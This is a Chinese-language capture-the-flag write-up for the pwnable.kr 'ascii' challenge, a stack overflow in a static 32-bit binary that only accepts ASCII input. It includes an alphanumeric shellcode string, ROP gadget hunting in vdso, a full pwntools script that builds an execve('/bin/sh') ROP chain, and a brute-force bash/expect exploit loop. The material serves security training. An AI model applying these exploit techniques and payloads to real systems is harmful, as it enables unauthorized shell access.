# pwnable.kr ascii writeup
## 读题
老规矩把 elf 文件下载到本地，查看保护机制，然后丢到 ghidra 查看源码
```shell
$ checksec ascii
[*] '/mnt/share/pwn/ascii'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

反编译：
```c

void main(void)
{
  char *pcVar1;
  void *pvVar2;
  int iVar3;
  uint local_14;
  
  pvVar2 = mmap((void *)0x80000000,0x1000,7,0x32,-1,0);
  if (pvVar2 != (void *)0x80000000) {
    puts("mmap failed. tell admin");
                    /* WARNING: Subroutine does not return */
    _exit(1);
  }
  printf("Input text : ");
  local_14 = 0;
  do {
    if (399 < local_14) break;
    pcVar1 = (char *)(local_14 + 0x80000000);
    iVar3 = getchar();
    *pcVar1 = (char)iVar3;
    local_14 = local_14 + 1;
    iVar3 = is_ascii((int)*pcVar1);
  } while (iVar3 != 0);
  puts("triggering bug...");
  vuln();
  return;
}

undefined4 is_ascii(int param_1)
{
  undefined4 uVar1;
  
  if ((param_1 < 0x20) || (0x7f < param_1)) {
    uVar1 = 0;
  }
  else {
    uVar1 = 1;
  }
  return uVar1;
}

void vuln(void)
{
  char local_ac [168];
  
  strcpy(local_ac,(char *)0x80000000);
  return;
}
```

这段程序的大意就是：
1. 在0x80000000地址上映射一段长度为0x1000，有RWX权限的区域。
2. 读取不超过400个 ascii 字符，并放到该地址。
3. 将该字符串复制到栈上，会造成栈溢出，返回地址的 padding 为0xa8+4。

___

## 分析
- 程序会检查输入字符是否为 ascii 字符（遇到非 ascii 字符会中止读取），因此输入字符必须满足该条件才会溢出。
- 分析代码会发现是先写入字符，再判断是否 ascii （即多写入一个非 ascii 字符），也许可以从这个点突破？
- 平常用的 shellcode 无法被完整读取，而且程序开启 NX 保护，也不能通过设置环境变量的方式执行。
- vmmap 查找合适的地址构造 ROP gadget：
```shell
gdb-peda$ vmmap
Start      End        Perm      Name
0x08048000 0x080ed000 r-xp      /home/ascii/ascii
0x080ed000 0x080ef000 rw-p      /home/ascii/ascii
0x080ef000 0x080f1000 rw-p      mapped
0x086c1000 0x086e3000 rw-p      [heap]
0xf7732000 0xf7735000 r--p      [vvar]
0xf7735000 0xf7736000 r-xp      [vdso]
0xff84f000 0xff870000 rw-p      [stack]
```
发现并没有合适的地址，而且分析2也用不上，strcpy 会附加一个 '\0' 字符。

查资料发现可以用命令`ulimit -s unlimited` 让 vdso 段地址满足 ascii 条件，重新尝试下：
```shell
gdb-peda$ vmmap
Start      End        Perm      Name
0x08048000 0x080ed000 r-xp      /home/ascii/ascii
0x080ed000 0x080ef000 rw-p      /home/ascii/ascii
0x080ef000 0x080f1000 rw-p      mapped
0x08ab8000 0x08ada000 rw-p      [heap]
0x55562000 0x55565000 r--p      [vvar]
0x55565000 0x55566000 r-xp      [vdso]
0xfffb7000 0xfffd8000 rw-p      [stack]
```
发现只有 vdso 段的地址满足条件（vvar 段虽然满足，但没有x权限），开始找 rop gadget。
**注意：系统的 ASLR 等级为2，vdso 段的地址会变动，可以多尝试几次直到地址满足条件。**

- 此时遇到一个大坑
查资料发现 vdso 的内容是跟内核相关的，而本地的 linux 内核版本与实验环境上的版本不一样，所以 vdso 也不一样，大小都不一样，因此必须拿到机器上 vdso 文件（？），而且本地也不方便调试。

下载 vdso 文件
1. 查看内核版本：
```shell
ascii@pwnable:~$ uname -r
4.4.179-0404179-generic
```
2. 查找 vdso 文件
```shell
ascii@pwnable:~$ find / -name vdso
/lib/modules/4.4.179-0404179-generic/vdso
/lib/modules/4.4.0-116-generic/vdso
/lib/modules/4.4.0-210-generic/vdso
...
ascii@pwnable:~$ ls /lib/modules/4.4.179-0404179-generic/vdso/
vdso32.so  vdso64.so  vdsox32.so
```
vdso32.so 应该就是需要的库文件，下载下来，开始构造rop chain。


#### 方法1：尝试 ret2shellcode：
先从网上找到一段纯 ascii 的 shellcode：
```
PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA
```

这个方法的思路就是将这段 shellcode 放到 0x80000000 ，然后构造 rop gadget 控制 eip 跳到该位置（不难构造，略）。

此时又遇到一个坑：
这段代码在本地和实验环境上单独运行都是ok的，而且将某几个寄存器的值改为与题目溢出处状态类似的值也可以运行，然而在题目上却会报段错误...

几番调试没有发现这段 shellcode 的精髓，于是放弃该方法。


#### 方法2：尝试 rop chain：
注意到 ascii 文件是静态编译，较大，应该有 rop chain：
```
$ ROPgadget --binary ascii --ropchain
```

找到的 rop chain 较长，考虑是否可以放在环境变量上，然后找一个类似`ret 0x80e`的 gadget 控制 esp 跳到 rop chain 上：
`$ export A=$(python2 -c 'print "<ropchain>"*0x1000')`

经过尝试，这段 rop chain 是可行的，然而，由于这段代码较长（100+），在实验环境开启了 ASLR 的前提下，想要精准跳到 rop chain 的开头还是比较难（即使将长度对齐）。另外，vdso 段的地址还得满足 ascii 条件。



#### 方法3：尝试 ret2syscall：
1. 查找修改所需要的寄存器的 rop gadget：
```shell
$ ROPgadget --binary vdso32.so --only 'int'
$ ROPgadget --binary vdso32.so --only 'pop|ret'
```

2. 找到几个有用的 gadget：
```
0x00000b5a : pop edx ; pop ecx ; ret
0x00000b36 : int 0x80
```

3. 这样 edx、ecx 的值就可控了，考虑到 ascii 条件，不能直接设置为 0，可以找一个值为0的地址，让寄存器的值等于该地址：
```
(gdb) find /b 0x55565000,+0x1000,0,0,0,0
```
找到的结果很多，先随便挑一个满足条件的。

4. ebx 的值很好解决，只需要指向某个字符串就可以。不难发现，当长度超出限制时，ebx指向最后一个ascii字符的位置：
```shell
$ mkdir /tmp/haha
$ cd /tmp/haha
$ export PATH=$PATH:$(pwd)
$ ln -s /bin/sh a
```
这样设置后，执行 `execve("a", 0, 0)` 相当于`execve("/bin/sh", 0, 0)`


5. 现在只差修改 eax 的 gadget 了：
```shell
$ ROPgadget --binary vdso32.so --depth 15 | grep eax
```
然而，就算增加查找深度还是没有找到好用的 gadget。

可以看到，很大的 ascii 文件中有大量可用的 gadget。我们可以综合方法2的思路，在环境变量里放一个很短的 gadget，完成最后两步：设置 eax 和 int 80。

构造 rop chain 还是挺简单的，但是还有一个坑：
我们要将 eax 设置为 0xb，即0x0000000b，后面的0会将环境变量弄乱。

```shell
$ ROPgadget --binary ascii --only 'mov|ret'
```

找到一条可用的 gadget：
```
0x080c1f80 : mov eax, dword ptr [edx + 0x4c] ; ret
```

也就是说，第3步不能随便找一个地址，edx 得满足几个条件：
```
edx的值满足ascii条件
[edx]=0
[edx+0x4c]=0xb
```
居然顺利的找到了！

6. 综上，只需要在环境变量中放置一个8字节的gadget，不难找到。

7. 最后，编写脚本，只要 vdso 的地址跟python脚本中的预设值一致，环境变量偏移设置正确，循环执行脚本相当次数，就能拿到flag。

___
## exp

生成gadget的脚本：
```python
import re
from pwn import *

context.arch = 'i386'
context.os = 'linux'
context.terminal = ['tmux', 'split-window', '-h']

# ROPgadget 查找结果
def build_rop_chain():
    p = b''
    p += p32(0x0805b4ba)  # pop edx ; ret
    p += p32(0x080ee060)  # @ .data
    p += p32(0x08089973)  # pop eax ; ret
    p += b'/bin'
    p += p32(0x0808e5bd)  # mov dword ptr [edx], eax ; ret
    p += p32(0x0805b4ba)  # pop edx ; ret
    p += p32(0x080ee064)  # @ .data + 4
    p += p32(0x08089973)  # pop eax ; ret
    p += b'//sh'
    p += p32(0x0808e5bd)  # mov dword ptr [edx], eax ; ret
    p += p32(0x0805b4ba)  # pop edx ; ret
    p += p32(0x080ee068)  # @ .data + 8
    p += p32(0x0804af60)  # xor eax, eax ; ret
    p += p32(0x0808e5bd)  # mov dword ptr [edx], eax ; ret
    p += p32(0x080481ec)  # pop ebx ; ret
    p += p32(0x080ee060)  # @ .data
    p += p32(0x080e434a)  # pop ecx ; ret
    p += p32(0x080ee068)  # @ .data + 8
    p += p32(0x0805b4ba)  # pop edx ; ret
    p += p32(0x080ee068)  # @ .data + 8
    p += p32(0x0804af60)  # xor eax, eax ; ret
    p += p32(0x0809a0bf)  # inc eax ; ret
    p += p32(0x0809a0bf)  # inc eax ; ret
    p += p32(0x0809a0bf)  # inc eax ; ret
    p += p32(0x0809a0bf)  # inc eax ; ret
    p += p32(0x0809a0bf)  # inc eax ; ret
    p += p32(0x0809a0bf)  # inc eax ; ret
    p += p32(0x0809a0bf)  # inc eax ; ret
    p += p32(0x0809a0bf)  # inc eax ; ret
    p += p32(0x0809a0bf)  # inc eax ; ret
    p += p32(0x0809a0bf)  # inc eax ; ret
    p += p32(0x0809a0bf)  # inc eax ; ret
    p += p32(0x08049469)  # int 0x80

    print(len(p))
    # 对齐
    p += b'a' * (256 - len(p))
    print(p)
    return p


def build_ret2syscall():
    vdso_addr = 0x55596000
    # pop edx; pop ecx; ret;
    gadget1_addr = vdso_addr + 0xb5a
    null_val_addr = vdso_addr + 0xc70
    # ret 0xa7eb;
    gadget2_addr = vdso_addr + 0xa57
    # ret
    gadget3_addr = vdso_addr + 0x66a

    # mov eax, dword ptr [edx + 0x4c] ; ret
    # 此时eax = 0xb
    gadget4_addr = 0x80c1f80
    # int 80
    gadget5_addr = 0x8049469

    rop_offset = 0xa8
    payload = b'a' * (rop_offset + 4)

    # 返回到gadget1
    payload += p32(gadget1_addr)
    payload += p32(null_val_addr)  # edx
    payload += p32(null_val_addr)  # ecx

    # 返回到gadget2
    payload += p32(gadget2_addr)

    # 返回到gadget3，此时esp应指向环境变量的位置
    payload += p32(gadget3_addr)

    # 让ebx指向某个字符串，ebx -> 'z'
    payload += b'z' * (400 - len(payload))

    env_arg = p32(gadget4_addr)
    env_arg += p32(gadget5_addr)

    # 即输入的字符串
    print('payload:', payload)
    # 环境变量，短gadget
    print('env_arg:', env_arg)


if __name__ == '__main__':
    build_ret2syscall()

```


暴力破解脚本：
```bash
#!/bin/bash

ulimit -s unlimited
mkdir -p /tmp/haha
cd /tmp/haha
ln -sf /bin/sh z

export PATH=$PATH:$(pwd)


for i in `seq 0 7`
do

echo "try padding ${i}..."

# ascii文件中找到的短gadget，长度=8
# 每次调整前后a的数量，最多8次
export A=`python3 -c "import sys; sys.stdout.buffer.write(b'a'*${i}+b'\x80\x1f\x0c\x08i\x94\x04\x08'*0x1fff+b'a'*(8-${i}))"`


for j in `seq 0 300`
do
#sleep .1
expect -c "
  set timeout 5;
  spawn ~/ascii
  expect {
    *:* { send \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaZkYUplYUplYUWjYUjfYUzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\n\" }
  }
  interact

"
done

done

```
